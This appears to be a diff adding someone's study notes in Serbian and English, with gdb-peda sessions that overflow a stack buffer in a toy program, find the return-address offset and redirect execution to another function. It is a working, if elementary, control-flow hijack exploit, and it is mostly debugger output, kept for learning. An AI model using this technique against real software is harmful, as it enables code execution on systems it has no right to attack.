+gdb-peda$ x/1xw $ebp
+0xffffd258:     0xffffd278
+
+
+gdb-peda$ info breakpoints
+Num     Type           Disp Enb Address    What
+1       breakpoint     keep y   0x565561e5 in function1 at overflowtest.c:10
+        breakpoint already hit 1 time
+2       breakpoint     keep y   0x565561f9 in function1 at overflowtest.c:11
+        breakpoint already hit 1 time
+3       breakpoint     keep y   0x5655621b in main at overflowtest.c:14
+        breakpoint already hit 1 time
+
+
+gdb-peda$ continue
+Continuing.
+Executed normally
+[Inferior 1 (process 26926) exited with code 022]
+Warning: not running
+
+
+#sad cemo da ga razbijemo
+gdb-peda$ run $(perl -e 'print "A" x 30')
+[----------------------------------registers-----------------------------------]
+EAX: 0xffffd270 --> 0x2 
+EBX: 0x56559000 --> 0x3efc 
+ECX: 0xffffd270 --> 0x2 
+EDX: 0xffffd294 --> 0x0 
+ESI: 0xf7fa6000 --> 0x1d9d6c 
+EDI: 0xf7fa6000 --> 0x1d9d6c 
+EBP: 0xffffd258 --> 0x0 
+ESP: 0xffffd250 --> 0xffffd270 --> 0x2 
+EIP: 0x5655621b (<main+28>:     mov    eax,DWORD PTR [eax+0x4])
+EFLAGS: 0x216 (carry PARITY ADJUST zero sign trap INTERRUPT direction overflow)
+[-------------------------------------code-------------------------------------]
+   0x5655620e <main+15>:        call   0x565560b0 <__x86.get_pc_thunk.bx>
+   0x56556213 <main+20>:        add    ebx,0x2ded
+   0x56556219 <main+26>:        mov    eax,ecx
+=> 0x5655621b <main+28>:        mov    eax,DWORD PTR [eax+0x4]
+   0x5655621e <main+31>:        add    eax,0x4
+   0x56556221 <main+34>:        mov    eax,DWORD PTR [eax]
+   0x56556223 <main+36>:        sub    esp,0xc
+   0x56556226 <main+39>:        push   eax
+[------------------------------------stack-------------------------------------]
+0000| 0xffffd250 --> 0xffffd270 --> 0x2 
+0004| 0xffffd254 --> 0x0 
+0008| 0xffffd258 --> 0x0 
+0012| 0xffffd25c --> 0xf7de6b41 (<__libc_start_main+241>:       add    esp,0x10)
+0016| 0xffffd260 --> 0xf7fa6000 --> 0x1d9d6c 
+0020| 0xffffd264 --> 0xf7fa6000 --> 0x1d9d6c 
+0024| 0xffffd268 --> 0x0 
+0028| 0xffffd26c --> 0xf7de6b41 (<__libc_start_main+241>:       add    esp,0x10)
+[------------------------------------------------------------------------------]
+Legend: code, data, rodata, value
+
+Breakpoint 3, main (argc=0x2, argv=0xffffd304) at overflowtest.c:14
+14              function1(argv[1]); 
+
+# jos uvek main funkcija
+gdb-peda$ x/16xw $esp
+0xffffd250:     0xffffd270      0x00000000      0x00000000      0xf7de6b41
+0xffffd260:     0xf7fa6000      0xf7fa6000      0x00000000      0xf7de6b41
+0xffffd270:     0x00000002      0xffffd304      0xffffd310      0xffffd294
+0xffffd280:     0x00000001      0x00000000      0xf7fa6000      0xffffffff
+gdb-peda$ x/1xw $ebp
+0xffffd258:     0x00000000
+
+
+gdb-peda$ continue
+[----------------------------------registers-----------------------------------]
+EAX: 0x56559000 --> 0x3efc 
+EBX: 0x56559000 --> 0x3efc 
+ECX: 0xffffd270 --> 0x2 
+EDX: 0xffffd294 --> 0x0 
+ESI: 0xf7fa6000 --> 0x1d9d6c 
+EDI: 0xf7fa6000 --> 0x1d9d6c 
+EBP: 0xffffd238 --> 0xffffd258 --> 0x0 
+ESP: 0xffffd220 --> 0xf7fa6000 --> 0x1d9d6c 
+EIP: 0x565561e5 (<function1+17>:        sub    esp,0x8)
+EFLAGS: 0x206 (carry PARITY adjust zero sign trap INTERRUPT direction overflow)
+[-------------------------------------code-------------------------------------]
+   0x565561d8 <function1+4>:    sub    esp,0x14
+   0x565561db <function1+7>:    call   0x5655624c <__x86.get_pc_thunk.ax>
+   0x565561e0 <function1+12>:   add    eax,0x2e20
+=> 0x565561e5 <function1+17>:   sub    esp,0x8
+   0x565561e8 <function1+20>:   push   DWORD PTR [ebp+0x8]
+   0x565561eb <function1+23>:   lea    edx,[ebp-0xd]
+   0x565561ee <function1+26>:   push   edx
+   0x565561ef <function1+27>:   mov    ebx,eax
+[------------------------------------stack-------------------------------------]
+0000| 0xffffd220 --> 0xf7fa6000 --> 0x1d9d6c 
+0004| 0xffffd224 --> 0xf7fa6000 --> 0x1d9d6c 
+0008| 0xffffd228 --> 0x0 
+0012| 0xffffd22c --> 0xf7dfdc7b (add    esp,0x10)
+0016| 0xffffd230 --> 0xf7fa63fc --> 0xf7fa7200 --> 0x0 
+0020| 0xffffd234 --> 0x56559000 --> 0x3efc 
+0024| 0xffffd238 --> 0xffffd258 --> 0x0 
+0028| 0xffffd23c (",bUV\266\324\377\377\004\323\377\377\020\323\377\377\023bUVp\322\377\377")
+[------------------------------------------------------------------------------]
+Legend: code, data, rodata, value
+
+Breakpoint 1, function1 (str=0xffffd4b6 'A' <repeats 30 times>) at overflowtest.c:10
+10              strcpy(buffer, str);
+
+
+#sve je pomereno za 32 bajta nagore u function1 stack-u (odnosno nanize u mem. lokacijama)
+prethodno 			sada
+esp 0xffffd270      0xffffd250 	<- 32 bajta razlika u mem.lokaciji
+
+ebp 0xffffd278 		0xffffd258
+
+
+gdb-peda$ x/16xw $esp
+0xffffd220:    0xf7fa6000      0xf7fa6000      0x00000000      0xf7dfdc7b
+0xffffd230:    0xf7fa63fc      0x56559000      0xffffd258      0x5655622c
+0xffffd240:    0xffffd4b6      0xffffd304      0xffffd310      0x56556213
+0xffffd250:    0xffffd270      0x00000000      0x00000000      0xf7de6b41
+
+gdb-peda$ x/1xw $ebp
+0xffffd238:     0xffffd258
+
+
+
+gdb-peda$ continue
+[----------------------------------registers-----------------------------------]
+EAX: 0xffffd22b ('A' <repeats 30 times>)
+EBX: 0x56559000 --> 0x3efc 
+ECX: 0xffffd4d0 ("AAAA")
+EDX: 0xffffd245 ("AAAA")
+ESI: 0xf7fa6000 --> 0x1d9d6c 
+EDI: 0xf7fa6000 --> 0x1d9d6c 
+EBP: 0xffffd238 ('A' <repeats 17 times>)
+ESP: 0xffffd220 --> 0xf7fa6000 --> 0x1d9d6c 
+EIP: 0x565561f9 (<function1+37>:        nop)
+EFLAGS: 0x282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
+[-------------------------------------code-------------------------------------]
+   0x565561ef <function1+27>:   mov    ebx,eax
+   0x565561f1 <function1+29>:   call   0x56556030 <strcpy@plt>
+   0x565561f6 <function1+34>:   add    esp,0x10
+=> 0x565561f9 <function1+37>:   nop
+   0x565561fa <function1+38>:   mov    ebx,DWORD PTR [ebp-0x4]
+   0x565561fd <function1+41>:   leave  
+   0x565561fe <function1+42>:   ret    
+   0x565561ff <main>:   lea    ecx,[esp+0x4]
+[------------------------------------stack-------------------------------------]
+0000| 0xffffd220 --> 0xf7fa6000 --> 0x1d9d6c 
+0004| 0xffffd224 --> 0xf7fa6000 --> 0x1d9d6c 
+0008| 0xffffd228 --> 0x41000000 ('')
+0012| 0xffffd22c ('A' <repeats 29 times>)
+0016| 0xffffd230 ('A' <repeats 25 times>)
+0020| 0xffffd234 ('A' <repeats 21 times>)
+0024| 0xffffd238 ('A' <repeats 17 times>)
+0028| 0xffffd23c ('A' <repeats 13 times>)
+[------------------------------------------------------------------------------]
+Legend: code, data, rodata, value
+
+Breakpoint 2, function1 (str=0x41414141 <error: Cannot access memory at address 0x41414141>) at overflowtest.c:11
+11      } 			<- evo buffer overflow-a
+
+
+#narednih 30 mem.lokacija (pocevsi od mem. lokacija dodeljenih char buffer[5] pa nanize je popunjeno sa A)
+
+gdb-peda$ x/16xw $esp
+0xffffd220:    0xf7fa6000      0xf7fa6000      0x41000000      0x41414141
+0xffffd230:    0x41414141      0x41414141      0x41414141      0x41414141
+0xffffd240:    0x41414141      0x41414141      0xffff0041      0x56556213
+0xffffd250:    0xffffd270      0x00000000      0x00000000      0xf7de6b41
+
+
+
+gdb-peda$ continue
+----------------------------------registers-----------------------------------]
+EAX: 0xffffd22b ('A' <repeats 30 times>)
+EBX: 0x41414141 ('AAAA')
+ECX: 0xffffd4d0 ("AAAA")
+EDX: 0xffffd245 ("AAAA")
+ESI: 0xf7fa6000 --> 0x1d9d6c 
+EDI: 0xf7fa6000 --> 0x1d9d6c 
+EBP: 0x41414141 ('AAAA')
+ESP: 0xffffd240 ("AAAAAAAAA")
+EIP: 0x41414141 ('AAAA')
+EFLAGS: 0x10282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
+[-------------------------------------code-------------------------------------]
+Invalid $PC address: 0x41414141
+[------------------------------------stack-------------------------------------]
+0000| 0xffffd240 ("AAAAAAAAA")
+0004| 0xffffd244 ("AAAAA")
+0008| 0xffffd248 --> 0xffff0041 --> 0x0 
+0012| 0xffffd24c --> 0x56556213 (<main+20>:     add    ebx,0x2ded)
+0016| 0xffffd250 --> 0xffffd270 --> 0x2 
+0020| 0xffffd254 --> 0x0 
+0024| 0xffffd258 --> 0x0 
+0028| 0xffffd25c --> 0xf7de6b41 (<__libc_start_main+241>:       add    esp,0x10)
+[------------------------------------------------------------------------------]
+Legend: code, data, rodata, value
+Stopped reason: SIGSEGV
+0x41414141 in ?? ()
+
+
+#When function1 returns, the program attempts to execute the instruc-
+tions at the return address for main , but the return address has been over-
+written with our As, causing the expected segmentation fault when trying
+to execute the instruction at the memory address 41414141 . (In the coming
+sections, we’ll discuss replacing the return address with something that
+redirects the program to code of our own instead of crashing it.)
+
+
+#kada je uneto AAAA
+
+#hex for capital A - 0x41
+gdb-peda$ x/16xw $esp
+ 												#entered AAAA (1, then 3)
+ 												#buffer je 5 karaktera
+0xffffd240:    0xf7fa6000      0xf7fa6000      0x41000000      0x00414141
+0xffffd250:    0xf7fa63fc      0x56559000      0xffffd278      0x5655622c
+0xffffd260:    0xffffd4d0      0xffffd324      0xffffd330      0x56556213
+0xffffd270:    0xffffd290      0x00000000      0x00000000      0xf7de6b41
+
+
+gdb-peda$ x/1xw $ebp
+0xffffd258:     0xffffd278
+
+
+imamo return adresu direktno nakon ebp (0x5655622c)
+imamo 12 bajta nakon unetih AAAA do return adrese
+(0xf7fa63fc      0x56559000      0xffffd278)
+
+AAAA + 12 bajta (ili 12 karaktera) +4 bajta (da unesemo na return adresu nasu vrednost)
+16xA (do return adrese) + 4xB (da proverimo da li ce biti prepisana sa 42424242)
+
+
+gdb-peda$ help delete
+Delete some breakpoints or auto-display expressions.
+Arguments are breakpoint numbers with spaces in between.
+To delete all breakpoints, give no argument.
+
+Also a prefix command for deletion of other GDB objects.
+The "unset" command is also an alias for "delete".
+
+List of delete subcommands:
+
+delete bookmark -- Delete a bookmark from the bookmark list
+delete breakpoints -- Delete some breakpoints or auto-display expressions
+delete checkpoint -- Delete a checkpoint (experimental)
+delete display -- Cancel some expressions to be displayed when program stops
+delete mem -- Delete memory region
+delete tracepoints -- Delete specified tracepoints
+delete tvariable -- Delete one or more trace state variables
+
+Type "help delete" followed by delete subcommand name for full documentation.
+Type "apropos word" to search for commands related to "word".
+Command name abbreviations are allowed if unambiguous.
+
+
+gdb-peda$ info breakpoints
+Num     Type           Disp Enb Address    What
+1       breakpoint     keep y   0x565561e5 in function1 at overflowtest.c:10
+        breakpoint already hit 1 time
+2       breakpoint     keep y   0x565561f9 in function1 at overflowtest.c:11
+        breakpoint already hit 1 time
+3       breakpoint     keep y   0x5655621b in main at overflowtest.c:14
+        breakpoint already hit 1 time
+gdb-peda$ delete 3
+gdb-peda$ delete 1
+
+Num     Type           Disp Enb Address    What
+2       breakpoint     keep y   0x565561f9 in function1 at overflowtest.c:11
+        breakpoint already hit 1 time
+
+
+gdb-peda$ run $(perl -e 'print "A" x 16 . "B" x 4')
+[----------------------------------registers-----------------------------------]
+EAX: 0xffffd23b ('A' <repeats 16 times>, "BBBB")
+EBX: 0x56559000 --> 0x3efc 
+ECX: 0xffffd4d0 ("BBBB")
+EDX: 0xffffd24b ("BBBB")
+ESI: 0xf7fa6000 --> 0x1d9d6c 
+EDI: 0xf7fa6000 --> 0x1d9d6c 
+EBP: 0xffffd248 ("AAABBBB")
+ESP: 0xffffd230 --> 0xf7fa6000 --> 0x1d9d6c 
+EIP: 0x565561f9 (<function1+37>:        nop)
+EFLAGS: 0x286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)
+[-------------------------------------code-------------------------------------]
+   0x565561ef <function1+27>:   mov    ebx,eax
+   0x565561f1 <function1+29>:   call   0x56556030 <strcpy@plt>
+   0x565561f6 <function1+34>:   add    esp,0x10
+=> 0x565561f9 <function1+37>:   nop
+   0x565561fa <function1+38>:   mov    ebx,DWORD PTR [ebp-0x4]
+   0x565561fd <function1+41>:   leave  
+   0x565561fe <function1+42>:   ret    
+   0x565561ff <main>:   lea    ecx,[esp+0x4]
+[------------------------------------stack-------------------------------------]
+0000| 0xffffd230 --> 0xf7fa6000 --> 0x1d9d6c 
+0004| 0xffffd234 --> 0xf7fa6000 --> 0x1d9d6c 
+0008| 0xffffd238 --> 0x41000000 ('')
+0012| 0xffffd23c ('A' <repeats 15 times>, "BBBB")
+0016| 0xffffd240 ('A' <repeats 11 times>, "BBBB")
+0020| 0xffffd244 ("AAAAAAABBBB")
+0024| 0xffffd248 ("AAABBBB")
+0028| 0xffffd24c --> 0x424242 ('BBB')
+[------------------------------------------------------------------------------]
+Legend: code, data, rodata, value
+
+Breakpoint 2, function1 (str=0xffffd4c0 'A' <repeats 16 times>, "BBBB") at overflowtest.c:11
+11      }
+
+nakon unetih 16xA + 4xB
+gdb-peda$ x/16xw $esp
+0xffffd230:    0xf7fa6000      0xf7fa6000      0x41000000      0x41414141
+# lokacija return adrese je sada prepisana sa BBBB
+0xffffd240:    0x41414141      0x41414141      0x42414141      0x00424242
+0xffffd250:    0xffffd4c0      0xffffd314      0xffffd320      0x56556213
+0xffffd260:    0xffffd280      0x00000000      0x00000000      0xf7de6b41
+
+
+#nakon unetih AAAA
+gdb-peda$ x/16xw $esp
+0xffffd220:    0xf7fa6000      0xf7fa6000      0x00000000      0xf7dfdc7b
+# lokacija return adrese 0x5655622c
+0xffffd230:    0xf7fa63fc      0x56559000      0xffffd258      0x5655622c
+0xffffd240:    0xffffd4b6      0xffffd304      0xffffd310      0x56556213
+0xffffd250:    0xffffd270      0x00000000      0x00000000      0xf7de6b41
+
+
+nakon unetih 17xA + 4xB (ne znam zasto taj jedan bajt razlike)
+gdb-peda$ x/16xw $esp
+0xffffd230:    0xf7fa6000      0xf7fa6000      0x41000000      0x41414141
+#return adresa je sada prepisana sa BBBB
+0xffffd240:    0x41414141      0x41414141      0x41414141      0x42424242
+0xffffd250:    0xffffd400      0xffffd314      0xffffd320      0x56556213
+0xffffd260:    0xffffd280      0x00000000      0x00000000      0xf7de6b41
+
+
+####
+Returning to our debugger, if we can find the start of overflowed in mem-
+ory, we should be able to replace our four Bs with that memory address, over-
+write the return address, and force the program to execute instructions the
+developers didn’t intend it to. We have the source code and know the function
+name we are looking for, so this task is trivial.
+
+
+#pre izvrsenja overflow-a
+gdb-peda$ disass overflowed
+Dump of assembler code for function overflowed:
+   0x000011a9 <+0>:     push   ebp
+   0x000011aa <+1>:     mov    ebp,esp
+   0x000011ac <+3>:     push   ebx
+   0x000011ad <+4>:     sub    esp,0x4
+   0x000011b0 <+7>:     call   0x124c <__x86.get_pc_thunk.ax>
+   0x000011b5 <+12>:    add    eax,0x2e4b
+   0x000011ba <+17>:    sub    esp,0xc
+   0x000011bd <+20>:    lea    edx,[eax-0x1ff8]
+   0x000011c3 <+26>:    push   edx
+   0x000011c4 <+27>:    mov    ebx,eax
+   0x000011c6 <+29>:    call   0x1040 <puts@plt>
+   0x000011cb <+34>:    add    esp,0x10
+   0x000011ce <+37>:    nop
+   0x000011cf <+38>:    mov    ebx,DWORD PTR [ebp-0x4]
+   0x000011d2 <+41>:    leave  
+   0x000011d3 <+42>:    ret    
+End of assembler dump.
+
+
+#posle izvrsenja overflow-a
+gdb-peda$ disass overflowed
+Dump of assembler code for function overflowed:
+#adresa prve innstrukcije
+   0x565561a9 <+0>:     push   ebp
+   0x565561aa <+1>:     mov    ebp,esp
+   0x565561ac <+3>:     push   ebx
+   0x565561ad <+4>:     sub    esp,0x4
+   0x565561b0 <+7>:     call   0x5655624c <__x86.get_pc_thunk.ax>
+   0x565561b5 <+12>:    add    eax,0x2e4b
+   0x565561ba <+17>:    sub    esp,0xc
+   0x565561bd <+20>:    lea    edx,[eax-0x1ff8]
+   0x565561c3 <+26>:    push   edx
+   0x565561c4 <+27>:    mov    ebx,eax
+   0x565561c6 <+29>:    call   0x56556040 <puts@plt>
+   0x565561cb <+34>:    add    esp,0x10
+   0x565561ce <+37>:    nop
+   0x565561cf <+38>:    mov    ebx,DWORD PTR [ebp-0x4]
+   0x565561d2 <+41>:    leave  
+   0x565561d3 <+42>:    ret    
+End of assembler dump.
+
+
+
+#iskoristion /s switch da prikaze source code
+gdb-peda$ disass /s overflowed
+Dump of assembler code for function overflowed:
+overflowtest.c:
+4       void overflowed() {
+
+# ova mem. lokacija sadrzi prvu instrukciju overflowed funkcije
+   0x000011a9 <+0>:     push   ebp
+
+   0x000011aa <+1>:     mov    ebp,esp
+   0x000011ac <+3>:     push   ebx
+   0x000011ad <+4>:     sub    esp,0x4
+   0x000011b0 <+7>:     call   0x124c <__x86.get_pc_thunk.ax>
+   0x000011b5 <+12>:    add    eax,0x2e4b
+
+5               printf("%s\n", "Execution hijacked");
+   0x000011ba <+17>:    sub    esp,0xc
+   0x000011bd <+20>:    lea    edx,[eax-0x1ff8]
+   0x000011c3 <+26>:    push   edx
+   0x000011c4 <+27>:    mov    ebx,eax
+   0x000011c6 <+29>:    call   0x1040 <puts@plt>
+   0x000011cb <+34>:    add    esp,0x10
+
+6       }
+   0x000011ce <+37>:    nop
+   0x000011cf <+38>:    mov    ebx,DWORD PTR [ebp-0x4]
+   0x000011d2 <+41>:    leave  
+   0x000011d3 <+42>:    ret    
+End of assembler dump.
+
+
+#sada unosim 17 A karaktera i adresu prve instrukcije overflow funkcije
+gdb-peda$ run $(perl -e 'print "A" x 17 . "\x56\x55\x61\xa9"')
+
+
+[----------------------------------registers-----------------------------------]
+EAX: 0xffffd23b ('A' <repeats 17 times>, "VUa\251")
+EBX: 0x56559000 --> 0x3efc 
+ECX: 0xffffd4d0 --> 0xa96155 
+EDX: 0xffffd24d --> 0xa96155 
+ESI: 0xf7fa6000 --> 0x1d9d6c 
+EDI: 0xf7fa6000 --> 0x1d9d6c 
+EBP: 0xffffd248 ("AAAAVUa\251")
+ESP: 0xffffd230 --> 0xf7fa6000 --> 0x1d9d6c 
+EIP: 0x565561f9 (<function1+37>:        nop)
+EFLAGS: 0x286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)
+[-------------------------------------code-------------------------------------]
+   0x565561ef <function1+27>:   mov    ebx,eax
+   0x565561f1 <function1+29>:   call   0x56556030 <strcpy@plt>
+   0x565561f6 <function1+34>:   add    esp,0x10
+=> 0x565561f9 <function1+37>:   nop
+   0x565561fa <function1+38>:   mov    ebx,DWORD PTR [ebp-0x4]
+   0x565561fd <function1+41>:   leave  
+   0x565561fe <function1+42>:   ret    
+   0x565561ff <main>:   lea    ecx,[esp+0x4]
+[------------------------------------stack-------------------------------------]
+0000| 0xffffd230 --> 0xf7fa6000 --> 0x1d9d6c 
+0004| 0xffffd234 --> 0xf7fa6000 --> 0x1d9d6c 
+0008| 0xffffd238 --> 0x41000000 ('')
+0012| 0xffffd23c ('A' <repeats 16 times>, "VUa\251")
+0016| 0xffffd240 ('A' <repeats 12 times>, "VUa\251")
+0020| 0xffffd244 ("AAAAAAAAVUa\251")
+0024| 0xffffd248 ("AAAAVUa\251")
+0028| 0xffffd24c --> 0xa9615556 
+[------------------------------------------------------------------------------]
+Legend: code, data, rodata, value
+
+Breakpoint 1, function1 (str=0xffffd400 "\021") at overflowtest.c:11
+11      }
+
+
+
+
+gdb-peda$ x/16xw $esp
+0xffffd230:     0xf7fa6000      0xf7fa6000      0x41000000     0x41414141
+
+#lokacija 0xffffd24c ima vrednost 0xa9615556, obrnuto od vrednosti koju smo uneli sa perl skriptom
+															   #
+0xffffd240:     0x41414141      0x41414141      0x41414141     0xa9615556
+0xffffd250:     0xffffd400      0xffffd314      0xffffd320     0x56556213
+0xffffd260:     0xffffd280      0x00000000      0x00000000     0xf7de6b41
+
+
+gdb-peda$ continue
+
+[----------------------------------registers-----------------------------------]
+EAX: 0xffffd23b ('A' <repeats 17 times>, "VUa\251")
+EBX: 0x41414141 ('AAAA')
+ECX: 0xffffd4d0 --> 0xa96155 
+EDX: 0xffffd24d --> 0xa96155 
+ESI: 0xf7fa6000 --> 0x1d9d6c 
+EDI: 0xf7fa6000 --> 0x1d9d6c 
+EBP: 0x41414141 ('AAAA')
+ESP: 0xffffd250 --> 0xffffd400 --> 0x11 
+EIP: 0xa9615556
+EFLAGS: 0x10286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)
+[-------------------------------------code-------------------------------------]
+
+#opet imamo access violation na adresi 0xa9615556
+#umesto 0x565561a9
+
+Invalid $PC address: 0xa9615556
+
+
+[------------------------------------stack-------------------------------------]
+0000| 0xffffd250 --> 0xffffd400 --> 0x11 
+0004| 0xffffd254 --> 0xffffd314 --> 0xffffd4a3 ("/home/kangus7/overflowtest")
+0008| 0xffffd258 --> 0xffffd320 --> 0xffffd4d4 ("SHELL=/bin/bash")
+0012| 0xffffd25c --> 0x56556213 (<main+20>:     add    ebx,0x2ded)
+0016| 0xffffd260 --> 0xffffd280 --> 0x2 
+0020| 0xffffd264 --> 0x0 
+0024| 0xffffd268 --> 0x0 
+0028| 0xffffd26c --> 0xf7de6b41 (<__libc_start_main+241>:       add    esp,0x10)
+[------------------------------------------------------------------------------]
+Legend: code, data, rodata, value
+Stopped reason: SIGSEGV
+0xa9615556 in ?? ()
+
+
+# Intel arhitektura je little endian (najmanje znacajni bit ide prvo)
+gdb-peda$ run $(perl -e 'print "A" x 17 . "\xa9\x61\x55\x56"')
+
+gdb-peda$ x/16xw $esp
+0xffffd230:     0xf7fa6000      0xf7fa6000      0x41000000     0x41414141
+#imamo odgovarajucu mem.lokaciju na poziciji return adrese funkcije function1
+ 															   #odje
+0xffffd240:     0x41414141      0x41414141      0x41414141     0x565561a9
+0xffffd250:     0xffffd400      0xffffd314      0xffffd320     0x56556213
+0xffffd260:     0xffffd280      0x00000000      0x00000000     0xf7de6b41
+
+
+gdb-peda$ continue
+[----------------------------------registers-----------------------------------]
+EAX: 0x13 
+EBX: 0x41414141 ('AAAA')
+ECX: 0xf7fa7890 --> 0x0 
+EDX: 0x13 
+ESI: 0xf7fa6000 --> 0x1d9d6c 
+EDI: 0xf7fa6000 --> 0x1d9d6c 
+EBP: 0x41414141 ('AAAA')
+ESP: 0xffffd254 --> 0xffffd314 --> 0xffffd4a3 ("/home/kangus7/overflowtest")
+EIP: 0xffffd400 --> 0x11
+EFLAGS: 0x10286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)
+[-------------------------------------code-------------------------------------]
+   0xffffd3fa:  add    BYTE PTR [eax],al
+   0xffffd3fc:  add    BYTE PTR [eax],dl
+   0xffffd3fe:  add    BYTE PTR [eax],al
+=> 0xffffd400:  adc    DWORD PTR [eax],eax
+   0xffffd402:  add    BYTE PTR [eax],al
+   0xffffd404:  add    BYTE PTR fs:[eax],al
+   0xffffd407:  add    BYTE PTR [ebx],al
+   0xffffd409:  add    BYTE PTR [eax],al
+[------------------------------------stack-------------------------------------]
+0000| 0xffffd254 --> 0xffffd314 --> 0xffffd4a3 ("/home/kangus7/overflowtest")
+0004| 0xffffd258 --> 0xffffd320 --> 0xffffd4d4 ("SHELL=/bin/bash")
+0008| 0xffffd25c --> 0x56556213 (<main+20>:     add    ebx,0x2ded)
+0012| 0xffffd260 --> 0xffffd280 --> 0x2 
+0016| 0xffffd264 --> 0x0 
+0020| 0xffffd268 --> 0x0 
+0024| 0xffffd26c --> 0xf7de6b41 (<__libc_start_main+241>:       add    esp,0x10)
+0028| 0xffffd270 --> 0xf7fa6000 --> 0x1d9d6c 
+[------------------------------------------------------------------------------]
+Legend: code, data, rodata, value
+Stopped reason: SIGSEGV
+0xffffd400 in ?? ()
+
+
+#ovako radi, jebem ti sve
+#zasto nbece u gdb-u
+#gdb isuvise brzo prikaze poruku overflowed funkcije i nastavi dalje
+#moram nekako da to sredim
+
+
+kangus7@kali:~$ ./overflowtest $(perl -e 'print "A" x 17 . "\xa9\x61\x55\x56"')
+Execution hijacked
+Segmentation fault
+
+
+We sent execution straight to overflowed without normal function-
+calling things like saving a return address. When overflowed ’s stack frame is
+unwound from the stack, the next memory address of the stack is assumed
+to be the return address, but this is just part of main ’s stack frame, so we crash.
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
